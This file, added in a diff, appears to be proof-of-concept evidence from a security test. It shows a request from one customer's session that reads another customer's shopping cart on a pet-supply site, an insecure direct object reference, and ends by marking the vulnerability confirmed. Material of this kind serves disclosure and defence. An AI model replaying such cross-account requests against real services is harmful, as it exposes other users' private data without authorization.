@@ -1,0 +1,89 @@
+API Response (Beginning) - Account B reading Account A's cart
+================================================================
+
+Request: GET /checkout/api/cart-api/v2/cart/6bd223b4-5040-4faa-ba85-6a85c1ec2d50
+Session: Account B (suobup@dunkos.xyz, customerId: 53260633)
+Response: HTTP 200 OK
+
+{
+    "cartId": 851483754,
+    "selectedDeliveryServiceId": 1,
+    "bonusPoints": 0,
+    "sid": "6bd223b4-5040-4faa-ba85-6a85c1ec2d50",
+    "domain": "zooplus.de",
+    "siteId": 1,
+    "currency": "EUR",
+    "locale": "de_DE",
+    "shipments": [
+        {
+            "id": 1,
+            "shipmentTotal": 206.97,
+            "totalInSecondaryCurrencyLabel": null,
+            "seller": {
+                "id": 1,
+                "name": "zooplus",
+                "sellerType": "1P"
+            }
+        }
+    ],
+    "deliveryDetails": {
+        "selectedDeliveryCountry": "D",
+        "selectedDeliveryCountryIsoCode": "DE",
+        "deliveryZipCode": null
+    },
+    "articles": [
+        {
+            "date": 1765261276527,
+            "id": 2966422,
+            "shopId": "386839.4",
+            "psId": "386839",
+            "productGroupId": 129272,
+            "productLink": "/shop/hunde/hundefutter_trockenfutter/belcando/belcando_adult/386839",
+            "categoryLink": "/shop/hunde/hundefutter_trockenfutter",
+            "type": "Standard",
+            "category": "DOGS",
+            "name": "Belcando Adult Dinner",
+            "variantName": "12,5 kg",
+            "pictureUrl": "https://media.zooplus.com/bilder/0/200/113606_pla_bewital_belcando_adult_dinner_12_5kg_hs_01_0.jpg",
+            "price": {
+                "value": 52.99,
+                "label": "52,99 €",
+                "labelFull": "52,99 €",
+                "labelPattern": "{0}",
+                "labelPrefix": "",
+                "currency": "EUR"
+            },
+            "quantity": 1,
+            "subTotal": 52.99
+        },
+        {
+            "date": 1765261276527,
+            "id": 2966095,
+            "name": "Belcando Adult Dinner",
+            "variantName": "Sparpaket: 2 x 12,5 kg",
+            "subTotal": 97.49
+        },
+        {
+            "date": 1765261276527,
+            "id": 2966421,
+            "name": "Belcando Senior Sensitive",
+            "variantName": "12,5 kg",
+            "subTotal": 56.49
+        }
+    ],
+    "summary": {
+        "grandTotal": 206.97,
+        "formattedGrandTotal": "206,97 €",
+        "subTotal": 206.97,
+        "formattedSubtotal": "206,97 €",
+        "articleCount": 3
+    }
+}
+
+⚠️ VULNERABILITY CONFIRMED:
+- Request made from Account B session (customerId: 53260633)
+- Response contains Account A's cart data
+- sid: "6bd223b4-5040-4faa-ba85-6a85c1ec2d50" (Account A's cart UUID)
+- articles: 3 items belonging to Account A
+- grandTotal: 206.97 EUR (Account A's cart total)
+
